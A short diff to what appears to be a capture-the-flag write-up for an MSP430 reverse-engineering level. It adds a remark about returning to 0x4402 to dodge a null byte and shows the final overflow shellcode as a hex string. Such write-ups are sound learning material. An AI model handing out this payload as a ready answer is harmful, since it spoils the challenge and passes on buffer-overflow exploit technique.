@@ -10,4 +10,6 @@ call #0x454c
 jmp #0x4656
 ```
 
+Also, we can't set the return address to 4400 like we'd like to (since it has a null byte), so we return to 4402, and just leave trash in 4400.
+
 Final shell code is **FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0244FFFF3c408efe3c50f1010c12b0124c45ff3f**.
